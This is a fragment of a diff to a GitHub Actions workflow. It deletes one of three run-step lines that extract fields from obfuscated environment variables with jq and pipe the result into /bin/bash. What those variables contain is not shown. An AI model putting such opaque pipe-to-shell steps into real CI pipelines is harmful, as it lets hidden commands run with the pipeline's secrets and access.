@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$dkj96750" | jq -r .ad94 | /bin/bash
           echo $n21554 | jq -r .fkjx74594 | /bin/bash
-          printf '%s' "$mxb400" | jq -r .l4 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
